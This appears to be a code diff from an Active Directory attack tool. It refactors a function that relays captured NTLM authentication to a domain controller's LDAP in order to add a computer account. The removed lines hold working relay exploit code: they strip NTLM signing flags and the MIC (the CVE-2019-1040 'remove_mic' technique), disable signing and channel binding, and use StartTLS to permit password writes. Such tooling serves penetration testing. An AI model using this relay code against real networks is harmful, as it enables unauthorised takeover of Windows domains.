@@ -156,129 +156,22 @@ async def _relay_add_computer(
     Returns (sAMAccountName, password, distinguishedName).
     Raises on any failure so the caller can wrap in RelayTargetResult.
     """
-    from asysocks.unicomm.common.target import UniProto  # noqa: PLC0415
-    from badauth.common.constants import asyauthProtocol, asyauthSecret  # noqa: PLC0415
-    from badauth.common.credentials import UniCredential  # noqa: PLC0415
-    from badauth.protocols.ntlm.structures.avpair import (  # noqa: PLC0415
-        AVPAIRType,
-        MsvAvFlags,
+    from adscan_internal.services.relay.ldap_relay_session import (  # noqa: PLC0415
+        establish_relay_ldap_session,
     )
-    from badauth.protocols.ntlm.structures.challenge_response import (  # noqa: PLC0415
-        NTLMv2Response,
-    )
-    from badauth.protocols.ntlm.structures.negotiate_flags import (  # noqa: PLC0415
-        NegotiateFlags,
-    )
-    from badldap.client import MSLDAPClient  # noqa: PLC0415
-    from badldap.commons.target import MSLDAPTarget  # noqa: PLC0415
-    from badldap.connection import MSLDAPClientConnection  # noqa: PLC0415
 
-    # Extract the raw NTLMRelayHandler — SICILY needs raw NTLM bytes, not SPNEGO.
-    ntlm_handler = None
-    if hasattr(gssapi, "authentication_contexts"):
-        ntlm_handler = gssapi.authentication_contexts.get(
-            "NTLMSSP - Microsoft NTLM Security Support Provider"
-        )
-    if ntlm_handler is None:
-        raise RuntimeError("Relay GSSAPI has no NTLM context — cannot do LDAP relay")
-
-    # Strip signing/seal flags from NEGOTIATE (force_signdisable) and zero the
-    # MIC in AUTHENTICATE via modify_authenticate_cb.  This mirrors ntlmrelayx's
-    # CVE-2019-1040 / remove_mic approach: without it the DC enables LDAP signing
-    # after the bind and subsequent LDAP ops arrive encrypted.
-    ntlm_handler.force_signdisable = True
-
-    async def _strip_mic(auth_srv, auth_raw):  # type: ignore[misc]
-        auth = auth_srv
-        for flag in (
-            NegotiateFlags.NEGOTIATE_ALWAYS_SIGN,
-            NegotiateFlags.NEGOTIATE_SIGN,
-            NegotiateFlags.NEGOTIATE_KEY_EXCH,
-            NegotiateFlags.NEGOTIATE_SEAL,
-        ):
-            auth.NegotiateFlags &= ~flag
-        auth.MIC = None
-        if isinstance(auth.NTChallenge, NTLMv2Response):
-            details = auth.NTChallenge.ChallengeFromClinet.Details
-            if AVPAIRType.MsvAvFlags in details:
-                if MsvAvFlags.MIC_PRESENT in details[AVPAIRType.MsvAvFlags]:
-                    details[AVPAIRType.MsvAvFlags] &= ~MsvAvFlags.MIC_PRESENT
-                    if details[AVPAIRType.MsvAvFlags] == 0:
-                        del details[AVPAIRType.MsvAvFlags]
-            details.pop(AVPAIRType.MsvAvSingleHost, None)
-        return auth, auth.to_bytes(), None
-
-    ntlm_handler.modify_authenticate_cb = _strip_mic
-
-    # SICILY credential — tells badldap to use the raw-NTLM bind path (no SPNEGO),
-    # avoiding signing negotiation entirely.
-    sicily_cred = UniCredential(
-        protocol=asyauthProtocol.SICILY,
-        secret="",
-        username="relay",
+    client, raw_conn, base_dn = await establish_relay_ldap_session(
+        gssapi=gssapi,
+        dc_ip=dc_ip,
         domain=domain,
-        stype=asyauthSecret.PASSWORD,
+        ldap_port=ldap_port,
+        disable_signing=disable_signing,
     )
-
-    target = MSLDAPTarget(
-        ip=dc_ip,
-        port=ldap_port,
-        protocol=UniProto.CLIENT_TCP,
-        domain=domain,
-    )
-
-    # Inject the NTLM relay handler (not the SPNEGORelay wrapper) as the auth
-    # context so SICILY's raw-token exchanges reach it directly.
-    raw_conn = MSLDAPClientConnection(target, sicily_cred, auth=ntlm_handler)
-    raw_conn._disable_signing = True
-    raw_conn._disable_channel_binding = True
-
-    _, err = await raw_conn.connect()
-    if err is not None:
-        raise RuntimeError(f"LDAP connect to {dc_ip}:{ldap_port} failed: {err}")
-
-    _, err = await raw_conn.bind()
-    if err is not None:
-        raise RuntimeError(f"LDAP relay bind failed: {err}")
-
-    print_info_debug(f"[ldap-add-computer] LDAP bind OK to {dc_ip}")
-
-    # Upgrade to TLS via StartTLS so the DC will accept unicodePwd writes.
-    # StartTLS (RFC 2830) does NOT enforce channel binding unlike LDAPS, so it
-    # works fine with a relay-authenticated session.
-    # NOTE: badldap resets status → CONNECTED after wrapping SSL; restore RUNNING
-    # (= bound) so subsequent LDAP operations succeed.
-    from badldap.commons.common import MSLDAPClientStatus  # noqa: PLC0415
-
-    tls_ok, tls_err = await raw_conn.starttls()
-    if tls_err is not None:
-        print_info_debug(
-            f"[ldap-add-computer] StartTLS failed ({tls_err}), unicodePwd may not be settable"
-        )
-    else:
-        raw_conn.status = MSLDAPClientStatus.RUNNING
-        print_info_debug("[ldap-add-computer] StartTLS OK — TLS active")
-
-    # Hand the authenticated connection to the high-level client.
-    client = MSLDAPClient(target, sicily_cred, connection=raw_conn)
-    client._disable_signing = disable_signing
-    client._disable_channel_binding = True
-    client.disconnected_evt = __import__("asyncio").Event()
-
-    # Populate serverinfo / tree so add_computer can derive the base DN.
-    serverinfo, err = await raw_conn.get_serverinfo()
-    if err is not None:
-        raise RuntimeError(f"get_serverinfo failed: {err}")
-    client._serverinfo = serverinfo
-    client._tree = serverinfo["defaultNamingContext"]
-    client._ldapinfo, err = await client.get_ad_info()
-    if err is not None:
-        raise RuntimeError(f"get_ad_info failed: {err}")
 
     if enforce_maq_preflight and relayed_username:
         can_create, reason = await _relay_can_create_machine(
             client=client,
-            base_dn=client._tree,
+            base_dn=base_dn,
             relayed_username=relayed_username,
         )
         if can_create is False:
@@ -292,7 +185,7 @@ async def _relay_add_computer(
         raw_conn=raw_conn,
         computer_name=desired_name,
         computer_password=computer_password,
-        base_dn=client._tree,
+        base_dn=base_dn,
     )
 
     try:
